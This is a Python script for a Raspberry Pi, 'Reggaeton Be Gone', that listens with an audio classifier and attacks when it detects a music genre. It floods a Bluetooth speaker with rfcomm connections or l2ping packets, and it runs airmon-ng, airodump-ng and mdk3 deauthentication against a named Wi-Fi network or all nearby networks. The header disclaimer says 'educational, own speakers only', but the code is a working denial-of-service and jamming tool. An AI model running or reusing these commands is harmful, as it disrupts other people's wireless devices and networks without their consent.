#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Reggaeton Be Gone
# Roni Bandini @RoniBandini https://bandini.medium.com
# February 2024 V 1.0 (Sucio y Desprolijo, as Pappo said)
# MIT License (c) 2024 Roni Bandini
# Disclaimer: this is an educational project. Use with your own BT speakers only.

import os
import subprocess
import sys, getopt
import signal
import time
import datetime
from edge_impulse_linux.audio import AudioImpulseRunner
from RPi import GPIO
import Adafruit_GPIO.SPI as SPI
import Adafruit_SSD1306
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont

# Settings
myPath="[mi ruta]"
selectedDeviceId = 10
method = 4 # 1 to 3
targetAddr = "[MAC]"
wifi = "[Nombre de WIFI]"
packagesSize = 800
threadsCount = 1000
threshold = 0.95
myDelay = 0.1
forceFire = 0
model = "model.eim"
archivo_aerodump = "redes_wifi-01.csv"

runner = None

# Push button
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
buttonPin = 26
GPIO.setup(buttonPin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Configuración del pin LED
ledPin = 13
ledPinAtaque= 5
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
GPIO.setup(ledPin, GPIO.OUT)
GPIO.setup(ledPinAtaque, GPIO.OUT)

def writeLog(myLine):
    now = datetime.datetime.now()
    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
    with open('./log.txt', 'a') as f:
        myLine=str(dtFormatted)+","+myLine
        f.write(myLine+"\n")



def fireBT(method, targetAddr, threadsCount, packagesSize, myDelay):

    writeLog("Firing with method #"+str(method)+ ", pkg "+ str(packagesSize) +', target ' + targetAddr)
    GPIO.output(ledPinAtaque, GPIO.HIGH)  # Enciende el LED al comenzar a ATACAR
    if method==1:
        # Small, are you there?
        for i in range(0, threadsCount):
            print('[*] ' + str(i + 1))
            subprocess.call(['rfcomm', 'connect', targetAddr, '1'])
            time.sleep(myDelay)

    if method==2:
        # Medium, I think you should listen
        for i in range(0, threadsCount):
            print('[*] ' + str(i + 1))
            os.system('sudo l2ping -i hci0 -s ' + str(packagesSize) +' -f ' + targetAddr)
            time.sleep(myDelay)

    if method==3:
        # XXL, Say hello to my little friend
        for i in range(0, threadsCount):
            print('[*] Sorry, Scarface method is not included in this version ' + str(i + 1))
            time.sleep(myDelay)

    if method==4:
        # Obtener el BSSID y el canal
        os.system('sudo airmon-ng check kill')
        os.system('sudo airmon-ng start wlan0')
        os.system('sudo timeout 10 airodump-ng wlan --output-format csv -w redes_wifi')
        bssid_encontrado, canal = obtener_bssid_y_canal(wifi, archivo_aerodump)

        if bssid_encontrado is not None and canal is not None:
            # Ejecutar mdk3 con el canal especificado
            os.system('sudo mdk3 wlan0 d -c 1,11,6,' + canal + ' ' + str(bssid_encontrado))
            time.sleep(20)
        else:
            print("No se pudo encontrar el BSSID y el canal de la red especificada.")

    if method==5:
        # XXL, Say hello to my little friend
        os.system('sudo airmon-ng check kill')
        os.system('sudo airmon-ng start wlan0')
        os.system('sudo mdk3 wlan0 d ')
        time.sleep(100)


def obtener_bssid_y_canal(nombre_red, archivo):
    with open(archivo, 'r') as f:
        lineas = f.readlines()

    # Buscar el BSSID correspondiente al nombre de la red y obtener el canal
    for linea in lineas:
        partes = linea.split(',')
        if len(partes) > 13 and partes[13].strip() == nombre_red:
            return partes[0], partes[3]

    # Si no se encuentra el nombre de la red, devolver None para el BSSID y el canal
    return None, None

def signal_handler(sig, frame):
    print('Interrupted')
    writeLog("Interrupted")
    if (runner):
        runner.stop()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main(argv):

    dir_path = os.path.dirname(os.path.realpath(__file__))
    modelfile = os.path.join(dir_path, model)

    print("")
    print("Reggaeton Be Gone 1.0")
    print("@RoniBandini, February 2024")
    print("Sounds are quite innoxious, or most distressing, by their sort rather than their quantity - Jane Austen")
    print("Waiting for button...")
    print("")
    print("")

    writeLog("Started")

    # Display
    #updateScreen(targetAddr, "Method #"+str(method))
    time.sleep(3)

    # Olmedo, No toca botón
    while GPIO.input(buttonPin) == GPIO.HIGH:
            time.sleep(1)

    writeLog("Listening")

    GPIO.output(ledPin, GPIO.HIGH)  # Enciende el LED al comenzar a escuchar    


    #updateScreen(targetAddr, "Listening...")
    print("Listening...")

    with AudioImpulseRunner(modelfile) as runner:
        try:
            model_info = runner.init()
            labels = model_info['model_parameters']['labels']
            print('Loaded AI-ML model "' + model_info['project']['owner'] + ' / ' + model_info['project']['name'] + '"')
            writeLog("AI model "+model_info['project']['name'])

            for res, audio in runner.classifier(device_id=selectedDeviceId):
                print("starting list")

                for label in labels:
                    score = res['result']['classification'][label]
                    print(label)

                    if label=='vallenato' and score<=threshold:
                        print('%s: %.2f\t' % (label, score))
                        #updateScreen("Is reggaeton?", str(round(score*100,2))+" %")

                    if label=='vallenato' and (score>threshold or forceFire==1):

                        #updateScreen("Firing speaker", "Score: "+ str(round(score*100,2))+" %" )
                        writeLog("Firing threshold: "+str(score))
                        time.sleep(4)                        

                        #image = Image.open(myPath+'images/logo.png').convert('1')
                        #disp.image(image)
                        #disp.display()

                        fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)

                print('')

        finally:
            GPIO.output(ledPin, GPIO.LOW)  # Apaga el LED al dejar de escuchar 
            GPIO.output(ledPinAtaque, GPIO.LOW)  # Apaga el LED al dejar de ATACAR
            if (runner):
                runner.stop()

if __name__ == '__main__':
    main(sys.argv[1:])
